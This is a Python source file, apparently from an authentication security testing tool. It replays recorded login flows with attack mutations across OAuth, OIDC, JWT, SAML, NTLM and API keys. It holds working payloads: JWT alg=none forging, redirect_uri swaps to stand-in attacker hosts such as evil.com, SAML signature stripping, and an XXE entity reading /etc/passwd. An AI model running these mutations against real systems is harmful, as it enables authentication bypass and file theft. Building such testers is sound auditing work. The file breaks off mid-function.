# app/core/auth_replay_engine.py
"""Enterprise-grade authentication replay and mutation testing engine.

Replays recorded authentication flows with protocol-specific attack mutations:
- OAuth 2.0: state bypass, redirect_uri manipulation, code reuse, scope escalation, PKCE bypass
- OIDC: nonce replay, id_token substitution, audience confusion
- NTLM: relay simulation, downgrade to NTLMv1, hash extraction
- Kerberos: ticket replay, SPN manipulation, delegation abuse
- SAML: assertion replay, signature stripping, attribute injection, XXE
- JWT: alg=none, key confusion (RS→HS), claim tampering, signature stripping
- FBA: credential stuffing, CSRF on login, session fixation
- API Key: key rotation test, scope boundary test
- Generic: token removal, token swap, privilege escalation, CSRF removal
"""
import json
import time
import base64
import copy
from typing import Dict, List, Optional, Any, Callable
from urllib.parse import urlparse, parse_qs, urlencode, quote
from PyQt6.QtCore import QObject, pyqtSignal, QThread
from app.core.logger import logger


# Try to import HTTP client; provide fallback if not available
try:
    from app.core.http_client import HttpRequest, HttpResponse, UnifiedHttpClient
except ImportError:
    # Minimal stubs for when http_client isn't available
    class HttpRequest:
        def __init__(self, **kwargs):
            for k, v in kwargs.items():
                setattr(self, k, v)
            self.method = kwargs.get('method', 'GET')
            self.url = kwargs.get('url', '')
            self.headers = kwargs.get('headers', {})
            self.data = kwargs.get('data', '')
            self.params = kwargs.get('params', {})
            self.cookies = kwargs.get('cookies', {})
            self.auth = kwargs.get('auth', None)
            self.timeout = kwargs.get('timeout', 30)
            self.allow_redirects = kwargs.get('allow_redirects', True)
            self.verify = kwargs.get('verify', True)

    class HttpResponse:
        def __init__(self):
            self.status_code = 0
            self.headers = {}
            self.text = ''
            self.url = ''
            self.elapsed_time = 0

    class UnifiedHttpClient:
        def send_request(self, req):
            return None


# ──────────────────────────────────────────────────────────────────────────────
# Mutation Categories
# ──────────────────────────────────────────────────────────────────────────────

MUTATION_CATEGORIES = {
    'generic': [
        'remove_auth_token',
        'use_expired_token',
        'swap_user_token',
        'remove_csrf',
        'privilege_escalation',
        'method_tampering',
    ],
    'oauth2': [
        'oauth_remove_state',
        'oauth_modify_redirect_uri',
        'oauth_code_reuse',
        'oauth_scope_escalation',
        'oauth_pkce_bypass',
        'oauth_implicit_token_leak',
        'oauth_client_id_swap',
    ],
    'oidc': [
        'oidc_nonce_replay',
        'oidc_audience_confusion',
        'oidc_id_token_swap',
    ],
    'jwt': [
        'jwt_alg_none',
        'jwt_signature_strip',
        'jwt_claim_tamper',
        'jwt_exp_bypass',
        'jwt_kid_injection',
    ],
    'saml': [
        'saml_assertion_replay',
        'saml_signature_strip',
        'saml_attribute_injection',
        'saml_xxe_injection',
        'saml_recipient_mismatch',
    ],
    'ntlm': [
        'ntlm_remove_auth',
        'ntlm_downgrade_v1',
        'ntlm_empty_challenge',
    ],
    'fba': [
        'fba_remove_csrf',
        'fba_session_fixation',
        'fba_empty_credentials',
    ],
    'api_key': [
        'api_key_remove',
        'api_key_invalid',
        'api_key_other_user',
    ],
}


class AuthReplayEngine(QObject):
    """Replays and mutates authentication flows with protocol-specific attacks."""

    replay_started = pyqtSignal(str)           # test_id
    replay_completed = pyqtSignal(str, dict)   # test_id, results
    request_sent = pyqtSignal(str, dict)       # test_id, request_info
    vulnerability_found = pyqtSignal(str, dict) # test_id, vuln_info
    progress_updated = pyqtSignal(str, int, int) # test_id, current, total

    def __init__(self):
        super().__init__()
        self.http_client = UnifiedHttpClient()
        self.active_tests: Dict[str, 'ReplayThread'] = {}

        # Register all mutation implementations
        self._mutations: Dict[str, Callable] = {
            # Generic
            'remove_auth_token': self._mut_remove_auth_token,
            'use_expired_token': self._mut_use_expired_token,
            'swap_user_token': self._mut_swap_user_token,
            'remove_csrf': self._mut_remove_csrf,
            'privilege_escalation': self._mut_privilege_escalation,
            'method_tampering': self._mut_method_tampering,
            # OAuth 2.0
            'oauth_remove_state': self._mut_oauth_remove_state,
            'oauth_modify_redirect_uri': self._mut_oauth_modify_redirect_uri,
            'oauth_code_reuse': self._mut_oauth_code_reuse,
            'oauth_scope_escalation': self._mut_oauth_scope_escalation,
            'oauth_pkce_bypass': self._mut_oauth_pkce_bypass,
            'oauth_implicit_token_leak': self._mut_oauth_implicit_token_leak,
            'oauth_client_id_swap': self._mut_oauth_client_id_swap,
            # OIDC
            'oidc_nonce_replay': self._mut_oidc_nonce_replay,
            'oidc_audience_confusion': self._mut_oidc_audience_confusion,
            'oidc_id_token_swap': self._mut_oidc_id_token_swap,
            # JWT
            'jwt_alg_none': self._mut_jwt_alg_none,
            'jwt_signature_strip': self._mut_jwt_signature_strip,
            'jwt_claim_tamper': self._mut_jwt_claim_tamper,
            'jwt_exp_bypass': self._mut_jwt_exp_bypass,
            'jwt_kid_injection': self._mut_jwt_kid_injection,
            # SAML
            'saml_assertion_replay': self._mut_saml_assertion_replay,
            'saml_signature_strip': self._mut_saml_signature_strip,
            'saml_attribute_injection': self._mut_saml_attribute_injection,
            'saml_xxe_injection': self._mut_saml_xxe_injection,
            'saml_recipient_mismatch': self._mut_saml_recipient_mismatch,
            # NTLM
            'ntlm_remove_auth': self._mut_ntlm_remove_auth,
            'ntlm_downgrade_v1': self._mut_ntlm_downgrade_v1,
            'ntlm_empty_challenge': self._mut_ntlm_empty_challenge,
            # FBA
            'fba_remove_csrf': self._mut_fba_remove_csrf,
            'fba_session_fixation': self._mut_fba_session_fixation,
            'fba_empty_credentials': self._mut_fba_empty_credentials,
            # API Key
            'api_key_remove': self._mut_api_key_remove,
            'api_key_invalid': self._mut_api_key_invalid,
            'api_key_other_user': self._mut_api_key_other_user,
        }

    # ──────────────────────────────────────────────────────────────────────
    # Public API
    # ──────────────────────────────────────────────────────────────────────

    def get_available_mutations(self, protocol: str = None) -> Dict[str, List[str]]:
        """Get available mutations, optionally filtered by protocol."""
        if protocol:
            return {protocol: MUTATION_CATEGORIES.get(protocol, [])}
        return MUTATION_CATEGORIES.copy()

    def replay_flow(self, flow_data: dict, test_name: str = "basic_replay") -> str:
        """Replay authentication flow without mutations (baseline test)."""
        test_id = f"{test_name}_{int(time.time())}"
        thread = ReplayThread(test_id, flow_data, self.http_client, [], self._mutations)
        self._start_thread(test_id, thread)
        return test_id

    def test_mutations(self, flow_data: dict, mutations: List[str],
                       test_name: str = "mutation_test") -> str:
        """Test authentication flow with specified mutations."""
        test_id = f"{test_name}_{int(time.time())}"
        thread = ReplayThread(test_id, flow_data, self.http_client, mutations, self._mutations)
        self._start_thread(test_id, thread)
        return test_id

    def run_security_tests(self, flow_data: dict, protocol: str = None) -> str:
        """Run comprehensive security tests based on detected protocol(s)."""
        mutations = []
        if protocol:
            mutations = MUTATION_CATEGORIES.get(protocol, [])
        else:
            # Auto-detect from flow data and run relevant tests
            detected = flow_data.get('detected_protocols', [])
            mutations = list(MUTATION_CATEGORIES.get('generic', []))
            for proto in detected:
                mutations.extend(MUTATION_CATEGORIES.get(proto, []))
        # Deduplicate while preserving order
        seen = set()
        unique = []
        for m in mutations:
            if m not in seen:
                seen.add(m)
                unique.append(m)
        return self.test_mutations(flow_data, unique, "security_test")

    def run_all_protocol_tests(self, flow_data: dict) -> str:
        """Run ALL available mutations (comprehensive audit)."""
        all_mutations = []
        for category_mutations in MUTATION_CATEGORIES.values():
            all_mutations.extend(category_mutations)
        return self.test_mutations(flow_data, all_mutations, "full_audit")

    def stop_test(self, test_id: str):
        """Stop an active test."""
        if test_id in self.active_tests:
            self.active_tests[test_id].stop()
            del self.active_tests[test_id]

    def _start_thread(self, test_id: str, thread: 'ReplayThread'):
        """Wire signals and start a replay thread."""
        thread.request_sent.connect(self.request_sent)
        thread.replay_completed.connect(self.replay_completed)
        thread.vulnerability_found.connect(self.vulnerability_found)
        thread.progress_updated.connect(self.progress_updated)
        thread.start()
        self.active_tests[test_id] = thread
        self.replay_started.emit(test_id)

    # ──────────────────────────────────────────────────────────────────────
    # Generic Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_remove_auth_token(self, request: dict) -> dict:
        """Remove all authentication tokens from the request."""
        r = self._copy_request(request)
        r['headers'].pop('Authorization', None)
        for key in list(r['params'].keys()):
            if key in ('access_token', 'token', 'bearer_token', 'auth_token'):
                del r['params'][key]
        if r.get('data'):
            r['data'] = self._remove_from_body(r['data'], r['headers'],
                                               ['access_token', 'token', 'bearer_token'])
        return r

    def _mut_use_expired_token(self, request: dict) -> dict:
        """Replace token with a known-expired/invalid one."""
        r = self._copy_request(request)
        if 'Authorization' in r['headers']:
            scheme = r['headers']['Authorization'].split(' ')[0]
            r['headers']['Authorization'] = f"{scheme} expired_invalid_token_000"
        return r

    def _mut_swap_user_token(self, request: dict) -> dict:
        """Swap token to simulate horizontal privilege escalation."""
        r = self._copy_request(request)
        if 'Authorization' in r['headers']:
            scheme = r['headers']['Authorization'].split(' ')[0]
            r['headers']['Authorization'] = f"{scheme} other_user_token_xyz789"
        return r

    def _mut_remove_csrf(self, request: dict) -> dict:
        """Remove CSRF tokens from request."""
        r = self._copy_request(request)
        csrf_names = ['csrf_token', 'authenticity_token', '_token',
                     'csrfmiddlewaretoken', '__RequestVerificationToken', 'X-CSRF-Token']
        for name in csrf_names:
            r['params'].pop(name, None)
            r['headers'].pop(name, None)
            r['headers'].pop('X-CSRF-Token', None)
            r['headers'].pop('X-CSRFToken', None)
        if r.get('data'):
            r['data'] = self._remove_from_body(r['data'], r['headers'], csrf_names)
        return r

    def _mut_privilege_escalation(self, request: dict) -> dict:
        """Modify user identifiers to test vertical/horizontal escalation."""
        r = self._copy_request(request)
        id_params = ['user_id', 'uid', 'id', 'account_id', 'customer_id', 'userId', 'accountId']
        for param in id_params:
            if param in r['params']:
                r['params'][param] = '1'  # Try admin ID
        if r.get('data'):
            r['data'] = self._replace_in_body(r['data'], r['headers'], id_params, '1')
        return r

    def _mut_method_tampering(self, request: dict) -> dict:
        """Change HTTP method to bypass access controls."""
        r = self._copy_request(request)
        # Try switching POST→GET or adding method override headers
        if r['method'] == 'POST':
            r['method'] = 'GET'
        elif r['method'] == 'GET':
            r['method'] = 'POST'
        # Also try X-HTTP-Method-Override
        r['headers']['X-HTTP-Method-Override'] = 'PUT'
        return r

    # ──────────────────────────────────────────────────────────────────────
    # OAuth 2.0 Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_oauth_remove_state(self, request: dict) -> dict:
        """Remove state parameter to test CSRF on OAuth callback."""
        r = self._copy_request(request)
        r['params'].pop('state', None)
        if r.get('data'):
            r['data'] = self._remove_from_body(r['data'], r['headers'], ['state'])
        return r

    def _mut_oauth_modify_redirect_uri(self, request: dict) -> dict:
        """Modify redirect_uri to test open redirect / token theft."""
        r = self._copy_request(request)
        malicious_uris = [
            'https://evil.com/callback',
            'https://attacker.com/steal',
            'http://localhost:9999/capture',
        ]
        if 'redirect_uri' in r['params']:
            r['params']['redirect_uri'] = malicious_uris[0]
        if r.get('data') and 'redirect_uri' in r['data']:
            r['data'] = self._replace_in_body(r['data'], r['headers'],
                                              ['redirect_uri'], malicious_uris[0])
        return r

    def _mut_oauth_code_reuse(self, request: dict) -> dict:
        """Replay an authorization code to test single-use enforcement."""
        # This mutation doesn't change the request — it replays it as-is
        # to see if the same code is accepted twice.
        return self._copy_request(request)

    def _mut_oauth_scope_escalation(self, request: dict) -> dict:
        """Add elevated scopes to authorization request."""
        r = self._copy_request(request)
        if 'scope' in r['params']:
            r['params']['scope'] += ' admin write:all delete:all'
        if r.get('data') and 'scope' in r['data']:
            r['data'] = self._replace_in_body(
                r['data'], r['headers'], ['scope'],
                'openid profile email admin write:all')
        return r

    def _mut_oauth_pkce_bypass(self, request: dict) -> dict:
        """Remove code_verifier or code_challenge to bypass PKCE."""
        r = self._copy_request(request)
        r['params'].pop('code_verifier', None)
        r['params'].pop('code_challenge', None)
        r['params'].pop('code_challenge_method', None)
        if r.get('data'):
            r['data'] = self._remove_from_body(r['data'], r['headers'],
                                               ['code_verifier', 'code_challenge', 'code_challenge_method'])
        return r

    def _mut_oauth_implicit_token_leak(self, request: dict) -> dict:
        """Change response_type to 'token' to force implicit grant."""
        r = self._copy_request(request)
        if 'response_type' in r['params']:
            r['params']['response_type'] = 'token'
        return r

    def _mut_oauth_client_id_swap(self, request: dict) -> dict:
        """Swap client_id to test client isolation."""
        r = self._copy_request(request)
        if 'client_id' in r['params']:
            r['params']['client_id'] = 'malicious_client_id_12345'
        if r.get('data') and 'client_id' in r['data']:
            r['data'] = self._replace_in_body(r['data'], r['headers'],
                                              ['client_id'], 'malicious_client_id_12345')
        return r

    # ──────────────────────────────────────────────────────────────────────
    # OIDC Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_oidc_nonce_replay(self, request: dict) -> dict:
        """Replay a previously used nonce value."""
        r = self._copy_request(request)
        if 'nonce' in r['params']:
            r['params']['nonce'] = 'replayed_nonce_value_old'
        return r

    def _mut_oidc_audience_confusion(self, request: dict) -> dict:
        """Inject a different audience value to test aud validation."""
        r = self._copy_request(request)
        # Modify id_token if present to change audience
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('Bearer ') and auth[7:].count('.') == 2:
            r['headers']['Authorization'] = 'Bearer ' + self._tamper_jwt_claim(
                auth[7:], 'aud', 'https://evil.com')
        return r

    def _mut_oidc_id_token_swap(self, request: dict) -> dict:
        """Replace id_token with one from a different user/issuer."""
        r = self._copy_request(request)
        # Generate a minimal forged id_token
        forged = self._forge_minimal_jwt({'sub': 'admin', 'iss': 'https://evil-idp.com',
                                          'aud': 'target_client', 'nonce': 'test'})
        if 'id_token' in r['params']:
            r['params']['id_token'] = forged
        return r

    # ──────────────────────────────────────────────────────────────────────
    # JWT Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_jwt_alg_none(self, request: dict) -> dict:
        """Set JWT algorithm to 'none' and remove signature."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('Bearer ') and auth[7:].count('.') == 2:
            token = auth[7:]
            parts = token.split('.')
            # Set header alg to none
            try:
                header = json.loads(self._b64url_decode(parts[0]))
                header['alg'] = 'none'
                new_header = self._b64url_encode(json.dumps(header).encode())
                # Empty signature
                r['headers']['Authorization'] = f"Bearer {new_header}.{parts[1]}."
            except Exception:
                pass
        return r

    def _mut_jwt_signature_strip(self, request: dict) -> dict:
        """Remove JWT signature entirely."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('Bearer ') and auth[7:].count('.') == 2:
            parts = auth[7:].split('.')
            r['headers']['Authorization'] = f"Bearer {parts[0]}.{parts[1]}."
        return r

    def _mut_jwt_claim_tamper(self, request: dict) -> dict:
        """Tamper with JWT claims (escalate role, change sub)."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('Bearer ') and auth[7:].count('.') == 2:
            tampered = self._tamper_jwt_claim(auth[7:], 'role', 'admin')
            tampered = self._tamper_jwt_claim(tampered, 'is_admin', True)
            r['headers']['Authorization'] = f"Bearer {tampered}"
        return r

    def _mut_jwt_exp_bypass(self, request: dict) -> dict:
        """Set JWT expiration far into the future."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('Bearer ') and auth[7:].count('.') == 2:
            future_exp = int(time.time()) + 31536000  # +1 year
            tampered = self._tamper_jwt_claim(auth[7:], 'exp', future_exp)
            r['headers']['Authorization'] = f"Bearer {tampered}"
        return r

    def _mut_jwt_kid_injection(self, request: dict) -> dict:
        """Inject malicious 'kid' header for key confusion attacks."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('Bearer ') and auth[7:].count('.') == 2:
            token = auth[7:]
            parts = token.split('.')
            try:
                header = json.loads(self._b64url_decode(parts[0]))
                # SQL injection / path traversal via kid
                header['kid'] = "../../dev/null"
                new_header = self._b64url_encode(json.dumps(header).encode())
                r['headers']['Authorization'] = f"Bearer {new_header}.{parts[1]}.{parts[2]}"
            except Exception:
                pass
        return r

    # ──────────────────────────────────────────────────────────────────────
    # SAML Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_saml_assertion_replay(self, request: dict) -> dict:
        """Replay a SAML assertion without modification (test replay protection)."""
        return self._copy_request(request)

    def _mut_saml_signature_strip(self, request: dict) -> dict:
        """Remove XML digital signature from SAML assertion."""
        r = self._copy_request(request)
        data = r.get('data', '')
        if 'SAMLResponse' in data or 'SAMLResponse' in r.get('params', {}):
            saml_value = r['params'].get('SAMLResponse', '')
            if not saml_value and 'SAMLResponse=' in data:
                parsed = parse_qs(data)
                saml_value = parsed.get('SAMLResponse', [''])[0]
            if saml_value:
                stripped = self._strip_saml_signature(saml_value)
                if 'SAMLResponse' in r['params']:
                    r['params']['SAMLResponse'] = stripped
                elif 'SAMLResponse=' in data:
                    r['data'] = self._replace_in_body(data, r['headers'],
                                                     ['SAMLResponse'], stripped)
        return r

    def _mut_saml_attribute_injection(self, request: dict) -> dict:
        """Inject additional attributes (e.g., admin role) into SAML assertion."""
        r = self._copy_request(request)
        # Similar to signature strip but with attribute injection
        # In real scenarios this modifies the XML before re-encoding
        data = r.get('data', '')
        if 'SAMLResponse' in r.get('params', {}) or 'SAMLResponse' in data:
            saml_value = r['params'].get('SAMLResponse', '')
            if not saml_value and 'SAMLResponse=' in data:
                parsed = parse_qs(data)
                saml_value = parsed.get('SAMLResponse', [''])[0]
            if saml_value:
                injected = self._inject_saml_attribute(saml_value, 'Role', 'Administrator')
                if 'SAMLResponse' in r['params']:
                    r['params']['SAMLResponse'] = injected
        return r

    def _mut_saml_xxe_injection(self, request: dict) -> dict:
        """Inject XXE payload into SAML request/response XML."""
        r = self._copy_request(request)
        # XXE payload that attempts to read server files
        xxe_payload = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        data = r.get('data', '')
        if 'SAMLRequest' in r.get('params', {}):
            # Prepend XXE to the decoded SAML XML
            r['params']['SAMLRequest'] = self._inject_xxe_into_saml(
                r['params']['SAMLRequest'], xxe_payload)
        return r

    def _mut_saml_recipient_mismatch(self, request: dict) -> dict:
        """Modify assertion Recipient/Destination to test validation."""
        r = self._copy_request(request)
        # Change the target URL in the request to see if assertion is still accepted
        if 'SAMLResponse' in r.get('params', {}):
            r['params']['RelayState'] = 'https://evil.com/acs'
        return r

    # ──────────────────────────────────────────────────────────────────────
    # NTLM Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_ntlm_remove_auth(self, request: dict) -> dict:
        """Remove NTLM authentication to test enforcement."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('NTLM ') or auth.startswith('Negotiate '):
            del r['headers']['Authorization']
        return r

    def _mut_ntlm_downgrade_v1(self, request: dict) -> dict:
        """Attempt to force NTLMv1 by modifying negotiate flags."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('NTLM ') or auth.startswith('Negotiate '):
            # Send a Type 1 message without NTLM2 flag
            # Minimal NTLM Negotiate message requesting NTLMv1
            ntlm_negotiate = (
                b'NTLMSSP\x00'  # Signature
                b'\x01\x00\x00\x00'  # Type 1
                b'\x07\x82\x08\x00'  # Flags (no NTLM2)
                b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Domain
                b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Workstation
            )
            prefix = auth.split(' ')[0]
            r['headers']['Authorization'] = f"{prefix} {base64.b64encode(ntlm_negotiate).decode()}"
        return r

    def _mut_ntlm_empty_challenge(self, request: dict) -> dict:
        """Send empty NTLM token to test error handling."""
        r = self._copy_request(request)
        auth = r['headers'].get('Authorization', '')
        if auth.startswith('NTLM ') or auth.startswith('Negotiate '):
            prefix = auth.split(' ')[0]
            r['headers']['Authorization'] = f"{prefix} "
        return r

    # ──────────────────────────────────────────────────────────────────────
    # FBA Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_fba_remove_csrf(self, request: dict) -> dict:
        """Remove CSRF token from login form submission."""
        return self._mut_remove_csrf(request)

    def _mut_fba_session_fixation(self, request: dict) -> dict:
        """Send a pre-set session cookie to test session fixation."""
        r = self._copy_request(request)
        r['cookies']['JSESSIONID'] = 'attacker_controlled_session_id'
        r['cookies']['session'] = 'attacker_controlled_session_id'
        r['cookies']['PHPSESSID'] = 'attacker_controlled_session_id'
        return r

    def _mut_fba_empty_credentials(self, request: dict) -> dict:
        """Submit login form with empty credentials."""
        r = self._copy_request(request)
        if r.get('data'):
            cred_fields = ['password', 'pass', 'passwd', 'pwd', 'j_password']
            r['data'] = self._replace_in_body(r['data'], r['headers'], cred_fields, '')
        return r

    # ──────────────────────────────────────────────────────────────────────
    # API Key Mutations
    # ──────────────────────────────────────────────────────────────────────

    def _mut_api_key_remove(self, request: dict) -> dict:
        """Remove API key entirely."""
        r = self._copy_request(request)
        api_headers = ['X-API-Key', 'X-Api-Key', 'Api-Key', 'X-Auth-Token',
                      'X-Access-Token', 'Ocp-Apim-Subscription-Key']
        for h in api_headers:
            r['headers'].pop(h, None)
        api_params = ['api_key', 'apikey', 'key', 'api-key', 'access_key', 'token']
        for p in api_params:
            r['params'].pop(p, None)
        return r

    def _mut_api_key_invalid(self, request: dict) -> dict:
        """Replace API key with an invalid value."""
        r = self._copy_request(request)
        api_headers = ['X-API-Key', 'X-Api-Key', 'Api-Key', 'X-Auth-Token',
                      'X-Access-Token', 'Ocp-Apim-Subscription-Key']
        for h in api_headers:
            if h in r['headers']:
                r['headers'][h] = 'invalid_key_00000000'
        api_params = ['api_key', 'apikey', 'key', 'api-key', 'access_key']
        for p in api_params:
            if p in r['params']:
                r['params'][p] = 'invalid_key_00000000'
        return r

    def _mut_api_key_other_user(self, request: dict) -> dict:
        """Replace API key with a different user's key (if available)."""
        r = self._copy_request(request)
        api_headers = ['X-API-Key', 'X-Api-Key', 'Api-Key', 'X-Auth-Token']
        for h in api_headers:
            if h in r['headers']:
                r['headers'][h] = 'other_user_api_key_xyz'
        return r

    # ──────────────────────────────────────────────────────────────────────
    # Helper Utilities
    # ──────────────────────────────────────────────────────────────────────

    def _copy_request(self, request: dict) -> dict:
        """Deep copy a request dict for mutation."""
        return {
            'method': request.get('method', 'GET'),
            'url': request.get('url', ''),
            'headers': dict(request.get('headers', {})),
            'data': request.get('data', ''),
            'params': dict(request.get('params', {})),
            'cookies': dict(request.get('cookies', {})),
        }

    def _remove_from_body(self, body: str, headers: dict, params: List[str]) -> str:
        """Remove parameters from request body."""
        ct = headers.get('Content-Type', '')
        if 'application/json' in ct:
            try:
                data = json.loads(body)
                for p in params:
                    data.pop(p, None)
                return json.dumps(data)
            except Exception:
                return body
        elif 'application/x-www-form-urlencoded' in ct:
            try:
                data = parse_qs(body, keep_blank_values=True)
                for p in params:
                    data.pop(p, None)
                return urlencode(data, doseq=True)
            except Exception:
                return body
        return body

    def _replace_in_body(self, body: str, headers: dict, params: List[str], new_value: str) -> str:
        """Replace parameter values in request body."""
        ct = headers.get('Content-Type', '')
        if 'application/json' in ct:
            try:
                data = json.loads(body)
                for p in params:
                    if p in data:
                        data[p] = new_value
                return json.dumps(data)
            except Exception:
                return body
        elif 'application/x-www-form-urlencoded' in ct:
            try:
                data = parse_qs(body, keep_blank_values=True)
                for p in params:
                    if p in data:
                        data[p] = [new_value]
                return urlencode(data, doseq=True)
            except Exception:
                return body
        return body

    def _b64url_decode(self, data: str) -> bytes:
        """Base64url decode with padding."""
        data += '=' * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(data)

    def _b64url_encode(self, data: bytes) -> str:
        """Base64url encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def _tamper_jwt_claim(self, token: str, claim: str, value: Any) -> str:
        """Modify a JWT claim (without valid signature)."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return token
            payload = json.loads(self._b64url_decode(parts[1]))
            payload[claim] = value
            new_payload = self._b64url_encode(json.dumps(payload).encode())
            return f"{parts[0]}.{new_payload}.{parts[2]}"
        except Exception:
            return token

    def _forge_minimal_jwt(self, claims: dict) -> str:
        """Create a minimal JWT with alg=none for testing."""
        header = self._b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        claims.setdefault('iat', int(time.time()))
        claims.setdefault('exp', int(time.time()) + 3600)
        payload = self._b64url_encode(json.dumps(claims).encode())
        return f"{header}.{payload}."

    def _strip_saml_signature(self, saml_b64: str) -> str:
        """Remove XML signature from base64-encoded SAML message."""
        try:
            raw = base64.b64decode(saml_b64)
            xml_str = raw.decode('utf-8', errors='replace')
            # Remove Signature element
            import re
            xml_str = re.sub(
                r'<ds:Signature[^>]*>.*?</ds:Signature>',
                '', xml_str, flags=re.DOTALL)
            xml_str = re.sub(
                r'<Signature[^>]*xmlns[^>]*>.*?</Signature>',
                '', xml_str, flags=re.DOTALL)
            return base64.b64encode(xml_str.encode('utf-8')).decode()
        except Exception:
            return saml_b64

    def _inject_saml_attribute(self, saml_b64: str, attr_name: str, attr_value: str) -> str:
        """Inject an attribute into a SAML assertion."""
        try:
            raw = base64.b64decode(saml_b64)
            xml_str = raw.decode('utf-8', errors='replace')
            # Inject before </AttributeStatement>
            injection = (
                f'<saml:Attribute Name="{attr_name}">'
                f'<saml:AttributeValue>{attr_value}</saml:AttributeValue>'
                f'</saml:Attribute>'
            )
            xml_str = xml_str.replace('</AttributeStatement>',
                                     injection + '</AttributeStatement>')
            return base64.b64encode(xml_str.encode('utf-8')).decode()
        except Exception:
            return saml_b64

    def _inject_xxe_into_saml(self, saml_b64: str, xxe_payload: str) -> str:
        """Inject XXE payload into SAML XML."""
        try:
            raw = base64.b64decode(saml_b64)
            xml_str = raw.decode('utf-8', errors='replace')
            # Inject DOCTYPE before root element
            if '<?xml' in xml_str:
                xml_str = xml_str.replace('?>', f'?>\n{xxe_payload}', 1)
            else:
                xml_str = xxe_payload + '\n' + xml_str
            return base64.b64encode(xml_str.encode('utf-8')).decode()
        except Exception:
            return saml_b64


# ──────────────────────────────────────────────────────────────────────────────
# Replay Thread
# ──────────────────────────────────────────────────────────────────────────────

class ReplayThread(QThread):
    """Background thread that replays a flow with mutations and analyzes results."""

    request_sent = pyqtSignal(str, dict)
    replay_completed = pyqtSignal(str, dict)
    vulnerability_found = pyqtSignal(str, dict)
    progress_updated = pyqtSignal(str, int, int)

    def __init__(self, test_id: str, flow_data: dict, http_client,
                 mutations: List[str], mutation_impls: Dict[str, Callable]):
        super().__init__()
        self.test_id = test_id
        self.flow_data = flow_data
        self.http_client = http_client
        self.mutations = mutations
        self.mutation_impls = mutation_impls
        self.should_stop = False

        self.results = {
            'test_id': test_id,
            'start_time': time.time(),
            'mutations_tested': mutations,
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'vulnerabilities': [],
            'responses': [],
            'baseline_responses': [],
        }

    def stop(self):
        self.should_stop = True

    def run(self):
        """Execute replay with mutations."""
        try:
            requests = self.flow_data.get('requests', [])
            auth_requests = [r for r in requests if r.get('is_auth_related')]
            target_requests = auth_requests if auth_requests else requests[:20]

            total_tests = len(target_requests) * max(1, len(self.mutations))
            current_test = 0

            if not self.mutations:
                # Baseline replay — no mutations
                for i, req_data in enumerate(target_requests):
                    if self.should_stop:
                        break
                    self._send_request(req_data, None, i)
                    current_test += 1
                    self.progress_updated.emit(self.test_id, current_test, total_tests)
                    time.sleep(0.3)
            else:
                # For each mutation, replay all auth-related requests
                for mutation_name in self.mutations:
                    if self.should_stop:
                        break
                    mutation_fn = self.mutation_impls.get(mutation_name)
                    if not mutation_fn:
                        continue

                    for i, req_data in enumerate(target_requests):
                        if self.should_stop:
                            break
                        self._send_request(req_data, mutation_name, i, mutation_fn)
                        current_test += 1
                        self.progress_updated.emit(self.test_id, current_test, total_tests)
                        time.sleep(0.3)

            self.results['end_time'] = time.time()
            self.results['duration'] = self.results['end_time'] - self.results['start_time']
            self.replay_completed.emit(self.test_id, self.results)

        except Exception as e:
            self.results['error'] = str(e)
            self.replay_completed.emit(self.test_id, self.results)

    def _send_request(self, req_data: dict, mutation_name: Optional[str],
                      sequence: int, mutation_fn: Callable = None):
        """Send a single request (optionally mutated) and analyze response."""
        # Apply mutation if provided
        if mutation_fn:
            mutated = mutation_fn(req_data)
        else:
            mutated = {
                'method': req_data.get('method', 'GET'),
                'url': req_data.get('url', ''),
                'headers': dict(req_data.get('headers', {})),
                'data': req_data.get('data', ''),
                'params': dict(req_data.get('params', {})),
                'cookies': dict(req_data.get('cookies', {})),
            }

        # Build HttpRequest
        http_req = HttpRequest(
            method=mutated['method'],
            url=mutated['url'],
            headers=mutated['headers'],
            data=mutated['data'],
            params=mutated['params'],
            cookies=mutated['cookies'],
            timeout=30,
            allow_redirects=False,
            verify=True,
        )

        self.request_sent.emit(self.test_id, {
            'sequence': sequence,
            'method': mutated['method'],
            'url': mutated['url'],
            'mutation': mutation_name,
        })

        response = self.http_client.send_request(http_req)
        self.results['requests_sent'] += 1

        if response:
            self.results['successful_requests'] += 1
            resp_info = {
                'sequence': sequence,
                'mutation': mutation_name,
                'status_code': response.status_code,
                'url': response.url or mutated['url'],
                'response_time': getattr(response, 'elapsed_time', 0),
                'content_length': len(response.text) if response.text else 0,
            }
            self.results['responses'].append(resp_info)

            # Vulnerability detection
            self._analyze_response(mutation_name, req_data, response, sequence)
        else:
            self.results['failed_requests'] += 1

    def _analyze_response(self, mutation_name: Optional[str], original: dict,
                          response, sequence: int):
        """Analyze response for vulnerabilities based on mutation type."""
        if not mutation_name:
            return  # Baseline — nothing to compare

        original_status = original.get('response_status', 0)
        new_status = response.status_code

        # Auth bypass: removed auth but still got 200
        if mutation_name in ('remove_auth_token', 'ntlm_remove_auth', 'api_key_remove'):
            if new_status == 200 and original_status == 200:
                self._report_vuln(mutation_name, "authentication_bypass",
                                  "critical", sequence,
